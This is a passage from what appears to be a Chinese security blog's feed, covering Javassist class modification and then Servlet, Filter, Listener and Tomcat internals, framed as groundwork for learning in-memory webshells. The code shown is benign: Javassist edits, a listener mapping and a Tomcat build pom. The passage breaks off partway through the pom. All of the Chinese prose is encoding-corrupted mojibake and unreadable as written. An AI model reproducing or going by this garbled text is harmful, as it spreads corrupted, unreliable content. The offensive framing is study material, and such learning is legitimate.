class="hljs-comment">//è®¾ç½®name=var1ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°</span><br>ctClass.addConstructor(cons);<br>ctClass.writeFile();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071713061.png" alt="image-20240907171307942"></p><blockquote><p>æ— å‚æ„é€ å»æ‰ä¸­é—´çš„å‚æ•°å³å¯</p></blockquote><h2 id="ä¿®æ”¹å·²æœ‰ç±»"><a href="#ä¿®æ”¹å·²æœ‰ç±»" class="headerlink" title="ä¿®æ”¹å·²æœ‰ç±»"></a>ä¿®æ”¹å·²æœ‰ç±»</h2><p>ç”¨ClassPoolè·å–CtClassä¹‹åè¿›è¡Œä¿®æ”¹ï¼Œæˆ‘ä»¬å¯¹æˆ‘ä»¬æˆ‘ä»¬å‰é¢åˆ›å»ºçš„Hello.classè¿›è¡Œä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ssist;<br><br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//å¯¹å·²æœ‰ç±»è¿›è¡Œä¿®æ”¹</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>));<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        classPool.insertClassPath(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavassistLearn&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.getCtClass(<span class="hljs-string">&quot;Temp.Hello&quot;</span>);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.getConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setBody(<span class="hljs-string">&quot;&#123;System.out.println(\&quot;changing\&quot;);&#125;&quot;</span>);<br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409071745179.png" alt="image-20240907174508054"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸä¿®æ”¹</p><blockquote><p>è¿™é‡Œæ·»åŠ ç±»è·¯å¾„çš„æ—¶å€™è¦æ³¨æ„åœ¨åŒ…åçš„ä¸Šä¸€å±‚ï¼Œä¸ç„¶ä¼šæ‰¾ä¸åˆ°ç±»ï¼Œå› ä¸ºgetçš„æ—¶å€™ç”¨å®Œæ•´åŒ…åä¼šè‡ªåŠ¨æ·»åŠ ä¸Šè·¯å¾„è¿›è¡Œæœç´¢</p><p>æ¯”å¦‚ä¸Šé¢çš„æ·»åŠ è·¯å¾„ä¸ºï¼šD:\CTF\Java\JavaCode\JavassistLearnï¼Œæœç´¢æ—¶å°±æ˜¯è¿™æ ·ï¼šD:\CTF\Java\JavaCode\JavassistLearn\Temp\Hello.class</p></blockquote><h1 id="ä¸€äº›ç‰¹æ®Šå˜é‡"><a href="#ä¸€äº›ç‰¹æ®Šå˜é‡" class="headerlink" title="ä¸€äº›ç‰¹æ®Šå˜é‡"></a>ä¸€äº›ç‰¹æ®Šå˜é‡</h1><p>å°±æ˜¯æˆ‘ä»¬å‰é¢ä½¿ç”¨çš„$1ï¼Œ$0é‚£äº›</p><table><thead><tr><th>æ ‡è¯†ç¬¦</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>$0ã€$1ã€$2ã€ $3ç­‰</td><td>thiså’Œæ–¹æ³•å‚æ•°ï¼ˆ1-Næ˜¯æ–¹æ³•å‚æ•°çš„é¡ºåºï¼‰</td></tr><tr><td>$args</td><td>æ–¹æ³•å‚æ•°æ•°ç»„ï¼Œç±»å‹ä¸ºObject[]</td></tr><tr><td>$$</td><td>æ‰€æœ‰æ–¹æ³•å‚æ•°ï¼Œä¾‹å¦‚ï¼šm($$)ç›¸å½“äºm($1,$2,â€¦)</td></tr><tr><td>$cflow(â€¦)</td><td>control flow å˜é‡</td></tr><tr><td>$r</td><td>è¿”å›ç»“æœçš„ç±»å‹ï¼Œåœ¨å¼ºåˆ¶è½¬æ¢è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚</td></tr><tr><td>$w</td><td>åŒ…è£…å™¨ç±»å‹ï¼Œåœ¨å¼ºåˆ¶è½¬æ¢è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚</td></tr><tr><td>$_</td><td>æ–¹æ³•çš„è¿”å›å€¼</td></tr><tr><td>$sig</td><td>ç±»å‹ä¸ºjava.lang.Classçš„å‚æ•°ç±»å‹å¯¹è±¡æ•°ç»„</td></tr><tr><td>$type</td><td>ç±»å‹ä¸ºjava.lang.Classçš„è¿”å›å€¼ç±»å‹</td></tr><tr><td>$class</td><td>ç±»å‹ä¸ºjava.lang.Classçš„æ­£åœ¨ä¿®æ”¹çš„ç±»</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å› ä¸ºçœ‹åˆ°åœ¨ç¼©çŸ­payloadçš„æ—¶å€™ä¼šç”¨åˆ°ï¼Œèµ¶ç´§æ¥å­¦ä¹ ä¸€ä¸‹ï¼Œå‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%</summary>
      
    
    
    
    <category term="javaåŸºç¡€" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>å†…å­˜é©¬å‰ç½®å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:05:36.000Z</published>
    <updated>2024-09-22T12:55:02.034Z</updated>
    
    <content type="html"><![CDATA[<p>å­¦å†…å­˜é©¬å‰å°±è¦æ¥å­¦ä¸€å­¦java webä¸‰å¤§ä»¶çš„ç›¸å…³åŸç†ï¼šServletã€Filterã€Listener</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/jadite/p/16951328.html">https://www.cnblogs.com/jadite/p/16951328.html</a></p><h1 id="servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="servletæ˜¯ä»€ä¹ˆ"><a href="#Servletæ˜¯ä»€ä¹ˆ" class="headerlink" title="Servletæ˜¯ä»€ä¹ˆ"></a>Servletæ˜¯ä»€ä¹ˆ</h2><p>Servletæ˜¯JavaEEè§„èŒƒï¼ˆæ¥å£ï¼‰ä¹‹ä¸€ï¼›<br>Servletæ˜¯è¿è¡Œåœ¨æœåŠ¡å™¨(Webå®¹å™¨Tomcatç­‰)ä¸Šçš„ä¸€ä¸ª java å°ç¨‹åºï¼Œå®ƒç”¨æ¥æ¥æ”¶å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œå¹¶å“åº”æ•°æ®ç»™å®¢æˆ·ç«¯ã€‚<br>ServletåŠç›¸å¯¹çš„å¯¹è±¡ï¼Œéƒ½ç”±Tomcatåˆ›å»ºï¼Œæˆ‘ä»¬åªæ˜¯ä½¿ç”¨ã€‚</p><blockquote><p>Tomcatå°±æ˜¯ä¸€ä¸ªservletå®¹å™¨</p></blockquote><p>Servletéœ€è¦å®Œæˆ3ä¸ªä»»åŠ¡ï¼š</p><ol><li>æ¥æ”¶è¯·æ±‚ï¼šå°†å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚å°è£…æˆServletRequestå¯¹è±¡ï¼ˆåŒ…å«è¯·æ±‚å¤´ã€å‚æ•°ç­‰å„ç§ä¿¡æ¯ï¼‰</li><li>å¤„ç†è¯·æ±‚ï¼šåœ¨serviceæ–¹æ³•ä¸­æ¥æ”¶å‚æ•°ï¼Œå¹¶ä¸”è¿›è¡Œå¤„ç†è¯·æ±‚ã€‚</li><li>æ•°æ®å“åº”ï¼šè¯·æ±‚å¤„ç†å®Œæˆåï¼Œé€šè¿‡è½¬å‘ï¼ˆforwardï¼‰æˆ–è€…é‡å®šå‘ï¼ˆredirectï¼‰åˆ°æŸä¸ªé¡µé¢ã€‚</li></ol><p><strong>Servletç¨‹åºå®ç°</strong></p><ol><li>å®ç°Servletæ¥å£ï¼Œé‡æ–°serviceæ–¹æ³•</li><li>åœ¨web.xmlæˆ–è€…ç”¨æ³¨è§£é…ç½®æ˜ å°„</li></ol><h2 id="servletç”Ÿå‘½å‘¨æœŸ"><a href="#Servletç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Servletç”Ÿå‘½å‘¨æœŸ"></a>Servletç”Ÿå‘½å‘¨æœŸ</h2><ol><li>æ‰§è¡Œ Servlet æ„é€ å™¨æ–¹æ³•<br>ç¬¬ä¸€æ­¥ï¼Œåœ¨web.xmlä¸­çš„servletä¸­é…ç½® load-on-startup çš„å€¼ â‰¥ 0 æ—¶ï¼Œè¡¨ç¤ºåº”ç”¨å¯åŠ¨æ—¶å°±åˆ›å»ºè¿™ä¸ªservletã€‚å¦åˆ™ï¼Œç¬¬ä¸€æ¬¡è®¿é—®çš„æ—¶å€™è°ƒç”¨ã€‚</li><li>æ‰§è¡Œ init åˆå§‹åŒ–æ–¹æ³•<br>ç¬¬äºŒæ­¥ï¼Œç¬¬ä¸€æ¬¡è®¿é—®çš„æ—¶å€™è°ƒç”¨ã€‚</li><li>æ‰§è¡Œ service æ–¹æ³•<br>ç¬¬ä¸‰æ­¥ï¼Œæ¯æ¬¡è®¿é—®éƒ½ä¼šè°ƒç”¨ã€‚</li><li>æ‰§è¡Œ destroy é”€æ¯æ–¹æ³•<br>ç¬¬å››æ­¥ï¼Œåœ¨ web å·¥ç¨‹åœæ­¢çš„æ—¶å€™è°ƒç”¨ã€‚</li></ol><h2 id="servletconfig"><a href="#ServletConfig" class="headerlink" title="ServletConfig"></a>ServletConfig</h2><p>å®ƒæ˜¯Servletç¨‹åºçš„é…ç½®ä¿¡æ¯ç±»</p><p><strong>å®ƒçš„ä¸‰å¤§ä½œç”¨ï¼š</strong></p><ol><li>è·å–web.xml ä¸­ Servlet ç¨‹åºçš„åˆ«å servlet-name çš„å€¼</li><li>è·å–web.xml ä¸­ Servlet ç¨‹åºçš„è·å–åˆå§‹åŒ–å‚æ•° init-param</li><li>è·å– ServletContext å¯¹è±¡</li></ol><p><strong>ServletConfig</strong></p><ol><li>æ¯ä¸ªwebé¡¹ç›®åªæœ‰ä¸€ä¸ªServletContextå¯¹è±¡ï¼Œåœ¨webå·¥ç¨‹éƒ¨ç½²å¯åŠ¨çš„æ—¶å€™åˆ›å»ºï¼Œåœ¨å·¥ç¨‹åœæ­¢çš„æ—¶å€™å…³é—­ã€‚</li><li>ServletContext å¯¹è±¡æ˜¯ä¸€ä¸ªåŸŸå¯¹è±¡ï¼ˆå¯ä»¥åƒMapä¸€æ ·å­˜å‚¨æ•°æ®çš„å¯¹è±¡ã€‚åŸŸæŒ‡çš„æ˜¯ä½œç”¨åŸŸï¼Œè¿™é‡Œæ˜¯æ•´ä¸ªwebå·¥ç¨‹ï¼‰ã€‚</li></ol><p><strong>ServletContext ç±»çš„å››ä¸ªä½œç”¨ï¼š</strong></p><ol><li>è·å– web.xml ä¸­é…ç½®çš„ä¸Šä¸‹æ–‡å‚æ•° context-param</li><li>getContextPath()è·å–å½“å‰çš„å·¥ç¨‹è·¯å¾„ï¼Œæ ¼å¼: &#x2F;å·¥ç¨‹è·¯å¾„</li><li>getRealPath()è·å–å·¥ç¨‹éƒ¨ç½²ååœ¨æœåŠ¡å™¨ç¡¬ç›˜ä¸Šçš„ç»å¯¹è·¯å¾„</li><li>åƒ Map ä¸€æ ·å­˜å–æ•°æ®</li></ol><p><strong>HttpServletRequestå’ŒHttpServletResponse</strong></p><p>HttpServletResponseç»§æ‰¿äº†ServletRequestï¼ŒHttpServletResponseç»§æ‰¿äº†ServletResponseï¼Œä»–ä»¬ä¸¤ä¸ªéƒ½æ˜¯æ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨doGetæˆ–è€…doPostçš„æ—¶å€™ä¼ å…¥çš„è‚¯å®šæ˜¯ä»–ä»¬çš„å®ç°ç±»ï¼Œè€Œè¿™ä¸ªå®ç°ç±»æ˜¯ç”±tomcatåˆ›å»ºçš„ï¼Œå°è£…äº†è¯·æ±‚å’Œå“åº”çš„ä¿¡æ¯ï¼Œåˆ°ä¸‹é¢è®²tomcatçš„æ—¶å€™å†ä¸²èµ·æ¥ç»†è¯´ã€‚</p><h1 id="filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h1><p>Filter æ˜¯JavaEEè§„èŒƒï¼ˆæ¥å£ï¼‰ä¹‹ä¸€ï¼›<br>Filter è¿‡æ»¤å™¨å®ƒçš„ä½œç”¨æ˜¯ï¼šæ‹¦æˆªè¯·æ±‚ï¼Œè¿‡æ»¤å“åº”ã€‚</p><p><strong>å¸¸è§åº”ç”¨åœºæ™¯ï¼š</strong><br>1ã€æƒé™æ£€æŸ¥<br>2ã€æ—¥è®°æ“ä½œ<br>3ã€äº‹åŠ¡ç®¡ç†<br>â€¦â€¦ç­‰ç­‰</p><p>æ‰€ä»¥Filterçš„é¡ºåºæ˜¯åœ¨å¤„ç†è¯·æ±‚ä¹‹å‰è¿›è¡Œ</p><p><strong>Filterä½¿ç”¨</strong></p><p>1ã€å®ç° Filter æ¥å£ï¼Œå®ç°è¿‡æ»¤æ–¹æ³• doFilter()<br>2ã€åˆ° web.xmlæˆ–è€…æ³¨è§£ä¸­å»é…ç½® Filter çš„æ‹¦æˆªè·¯å¾„</p><h2 id="filterç”Ÿå‘½å‘¨æœŸ"><a href="#Filterç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Filterç”Ÿå‘½å‘¨æœŸ"></a>Filterç”Ÿå‘½å‘¨æœŸ</h2><ol><li>æ„é€ å™¨æ–¹æ³•</li><li>init åˆå§‹åŒ–æ–¹æ³•<br>ç¬¬ 1ï¼Œ2 æ­¥ï¼Œåœ¨ web å·¥ç¨‹å¯åŠ¨çš„æ—¶å€™æ‰§è¡Œï¼ˆFilter å·²ç»åˆ›å»ºï¼‰</li><li>doFilter è¿‡æ»¤æ–¹æ³•<br>ç¬¬ 3 æ­¥ï¼Œæ¯æ¬¡æ‹¦æˆªåˆ°è¯·æ±‚ï¼Œå°±ä¼šæ‰§è¡Œ</li><li>destroy é”€æ¯<br>ç¬¬ 4 æ­¥ï¼Œåœæ­¢ web å·¥ç¨‹çš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œï¼ˆåœæ­¢ web å·¥ç¨‹ï¼Œä¹Ÿä¼šé”€æ¯ Filter è¿‡æ»¤å™¨ï¼‰</li></ol><h2 id="filterconfig"><a href="#FilterConfig" class="headerlink" title="FilterConfig"></a>FilterConfig</h2><p>Tomcat æ¯æ¬¡åˆ›å»º Filter çš„æ—¶å€™ï¼Œä¹Ÿä¼šåŒæ—¶åˆ›å»ºä¸€ä¸ª FilterConfig ç±»ï¼Œè¿™é‡ŒåŒ…å«äº† Filter é…ç½®æ–‡ä»¶çš„é…ç½®ä¿¡æ¯ã€‚</p><p><strong>FilterConfig ç±»çš„ä½œç”¨æ˜¯è·å– filter è¿‡æ»¤å™¨çš„é…ç½®å†…å®¹ï¼š</strong></p><ol><li>è·å– Filter çš„åç§° filter-name çš„å†…å®¹</li><li>è·å–åœ¨ Filter ä¸­é…ç½®çš„ init-param åˆå§‹åŒ–å‚æ•°</li><li>è·å– ServletContext å¯¹è±¡</li></ol><h2 id="filterchain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h2><p>å°±æ˜¯è¿‡æ»¤å™¨é“¾ï¼Œè¿‡æ»¤å™¨å¯èƒ½å­˜åœ¨ä¸æ­¢ä¸€ä¸ªï¼Œå®ƒä»¬æ‰§è¡Œçš„ä¼˜å…ˆé¡ºåºç”±å®ƒä»¬åœ¨web.xmlä¸­ä»ä¸Šåˆ°ä¸‹é…ç½®çš„<strong>filter-mapping</strong>é¡ºåºå†³å®šï¼Œä¸filterçš„é…ç½®é¡ºåºæ— å…³</p><p><strong>ç‰¹ç‚¹</strong></p><ol><li>æ‰€æœ‰filterå’Œç›®æ ‡èµ„æºé»˜è®¤éƒ½æ‰§è¡Œåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­ã€‚</li><li>å¤šä¸ªfilterå…±åŒæ‰§è¡Œçš„æ—¶å€™ï¼Œå®ƒä»¬ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªRequestå¯¹è±¡ã€‚</li></ol><p><strong>æ‹¦æˆªè·¯å¾„åŒ¹é…è§„åˆ™</strong></p><ul><li>ç²¾ç¡®åŒ¹é… &#x2F;target.jsp</li><li>ç›®å½•åŒ¹é… &#x2F;admin&#x2F;*</li><li>åç¼€ååŒ¹é… *.html</li></ul><blockquote><p>Filteråªå…³å¿ƒè·¯å¾„æ˜¯å¦åŒ¹é…ï¼Œä¸å…³å¿ƒèµ„æºæ˜¯å¦å­˜åœ¨ï¼Œæ¯•ç«Ÿæœ€ç»ˆä¸æ˜¯ç”±å®ƒæ¥å¤„ç†</p></blockquote><h1 id="listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h1><p>ç”¨äºå¯¹å…¶ä»–å¯¹è±¡èº«ä¸Šå‘ç”Ÿçš„äº‹ä»¶æˆ–çŠ¶æ€æ”¹å˜è¿›è¡Œç›‘å¬å’Œç›¸åº”å¤„ç†çš„å¯¹è±¡ï¼Œå½“è¢«ç›‘è§†çš„å¯¹è±¡å‘ç”Ÿæƒ…å†µæ—¶ï¼Œç«‹å³é‡‡å–ç›¸åº”çš„è¡ŒåŠ¨ã€‚æœ¬è´¨æ˜¯<strong>è§‚å¯Ÿè€…æ¨¡å¼</strong>ã€‚</p><p><strong>Servletç›‘å¬å™¨</strong>ï¼šServletè§„èŒƒä¸­å®šä¹‰çš„ä¸€ç§ç‰¹æ®Šç±»ï¼Œå®ƒç”¨äºç›‘å¬Webåº”ç”¨ç¨‹åºä¸­çš„ServletContextï¼ŒHttpSession å’ŒHttpServletRequestç­‰åŸŸå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯äº‹ä»¶ï¼Œä»¥åŠç›‘å¬è¿™äº›åŸŸå¯¹è±¡ä¸­çš„å±æ€§å‘ç”Ÿä¿®æ”¹çš„äº‹ä»¶ã€‚</p><h2 id="ä¸‰ç±»ç›‘å¬å™¨"><a href="#ä¸‰ç±»ç›‘å¬å™¨" class="headerlink" title="ä¸‰ç±»ç›‘å¬å™¨"></a>ä¸‰ç±»ç›‘å¬å™¨</h2><p><img src="https://cdn.clown2024.cn/202409080210968.png" alt="image-20240908021003987"></p><ul><li>åŸŸå¯¹è±¡ç›‘å¬å™¨</li><li>åŸŸå¯¹è±¡çš„å±æ€§åŸŸç›‘å¬å™¨</li><li>SessionåŸŸä¸­æ•°æ®çš„ç›‘å¬å™¨</li></ul><h2 id="å…«å¤§ç›‘å¬å™¨"><a href="#å…«å¤§ç›‘å¬å™¨" class="headerlink" title="å…«å¤§ç›‘å¬å™¨"></a>å…«å¤§ç›‘å¬å™¨</h2><ol><li><p>ServletContextListener<br>ç›‘å¬ServletContextå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯</p><p>åœ¨SpringMVCä¸­ï¼Œæœ‰ä¸ª<strong>ContextLoaderListener</strong>ï¼Œè¿™ä¸ªç›‘å¬å™¨å°±å®ç°äº†ServletContextListeneræ¥å£ï¼Œè¡¨ç¤ºå¯¹ServletContextå¯¹è±¡æœ¬èº«çš„ç”Ÿå‘½å‘¨æœŸè¿›è¡Œç›‘æ§</p></li><li><p>HttpSessionListener</p><p>ç›‘å¬HttpSessionå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯</p></li><li><p>ServletRequestListener</p><p>ç›‘å¬ServletRequestå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯</p></li><li><p>ServletContextAttributeListener</p><p>ç›‘å¬ServletContextä¸­å±æ€§çš„åˆ›å»ºã€ä¿®æ”¹å’Œé”€æ¯</p></li><li><p>HttpSessionAttributeListener</p><p>ç›‘å¬HttpSessionä¸­å±æ€§çš„åˆ›å»ºã€ä¿®æ”¹å’Œé”€æ¯</p></li><li><p>ServletRequestAttributeListener</p><p>ç›‘å¬ServletRequestä¸­å±æ€§çš„åˆ›å»ºã€ä¿®æ”¹å’Œé”€æ¯</p></li><li><p>HttpSessionBindingListener</p><p>ç›‘å¬æŸä¸ªå¯¹è±¡åœ¨SessionåŸŸä¸­çš„åˆ›å»ºä¸ç§»é™¤</p></li><li><p>HttpSessionActivationListener</p><p>ç›‘å¬æŸä¸ªå¯¹è±¡åœ¨Sessionä¸­çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚</p></li></ol><h2 id="ç›‘å¬å™¨ä½¿ç”¨"><a href="#ç›‘å¬å™¨ä½¿ç”¨" class="headerlink" title="ç›‘å¬å™¨ä½¿ç”¨"></a>ç›‘å¬å™¨ä½¿ç”¨</h2><ol><li><p>å®ç°å…«å¤§ç›‘å¬å™¨ä¸­çš„ä¸€ç§ï¼Œé‡å†™å¯¹åº”æ–¹æ³•</p></li><li><p>åŒæ ·å»web.xmlæˆ–è€…ç”¨æ³¨è§£é…ç½®</p><p>web.xmlé…ç½®</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>com.demo.listener.HelloListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>æ¨èä¸€ä¸ªè§†é¢‘è®²å¾—éå¸¸å¥½(æˆ‘ä¸ªäººè§‰å¾—)ï¼ŒæŠŠå¾ˆå¤šä¸œè¥¿ä¸²èµ·æ¥äº†è€Œä¸”æ·±å…¥åˆ°æºç å±‚é¢ï¼Œç†è§£å¾—æ›´åŠ æ¸…æ™°</p><p>è§†é¢‘é“¾æ¥ï¼š<a href="https://www.bilibili.com/video/BV19E411j7cD/?spm_id_from=333.999.0.0&vd_source=f056182291458f597ae69cee19ecf116">ã€å›¾çµå­¦é™¢ã€‘ç»ˆäºæœ‰äººæŠŠtomcatè®²æ¸…æ¥šäº†ï¼Tomcatåº•å±‚åŸç†æ·±åº¦è§£æ_å“”å“©å“”å“©_bilibili</a></p><p><strong>Tomcatç®€å•æ¶æ„å›¾</strong></p><p><img src="https://cdn.clown2024.cn/202409122011964.png" alt="image-20240912201120883"></p><p>æ‰¾åˆ°çš„å¦ä¸€å¼ æ¶æ„å›¾</p><p><img src="https://cdn.clown2024.cn/202409142315429.png" alt="image-20240914231538327"></p><h2 id="tomcatæºç å¯åŠ¨"><a href="#Tomcatæºç å¯åŠ¨" class="headerlink" title="Tomcatæºç å¯åŠ¨"></a>Tomcatæºç å¯åŠ¨</h2><p>è¿™é‡Œå°±æäº†æˆ‘å¥½ä¹…äº†ï¼Œçœ‹äº†å¾ˆå¤šæ–‡ç« æ‰æå®šï¼Œæœ€åå‚è€ƒçš„æ˜¯ä¸‹é¢ä¸¤ç¯‡æ–‡ç« </p><p><a href="https://blog.csdn.net/zhoutaoping1992/article/details/104751705">è®°ä¸€æ¬¡tomcatæºç å¯åŠ¨æ§åˆ¶å°ä¸­æ–‡ä¹±ç é—®é¢˜è°ƒè¯•è¿‡ç¨‹_org.apache.catalina.startup.versionloggerlistener.-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/huim/p/16614196.html">ideaè°ƒè¯•tomcatæºç  - huim - åšå®¢å›­ (cnblogs.com)</a></p><p><strong>æºç ä¸‹è½½</strong></p><p>é¦–å…ˆæ‰¾åˆ°æºç åŒ…ä¸‹è½½ï¼Œè¿™é‡Œç”¨çš„tomcat-8.5.50çš„ç‰ˆæœ¬</p><p>å†å²ç‰ˆæœ¬åˆ—è¡¨ï¼š<a href="https://archive.apache.org/dist/tomcat/tomcat-8/">https://archive.apache.org/dist/tomcat/tomcat-8/</a><br>æºç æ–‡ä»¶å¤¹ï¼š<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/</a></p><p>ç„¶ååœ¨æºç æ ¹ç›®å½•ä¸‹æ·»åŠ å¦‚ä¸‹pom.xmlæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sourceDirectory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">sourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testSourceDirectory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">testSourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testResources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">testResource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">testResource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">testResources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>                    <span 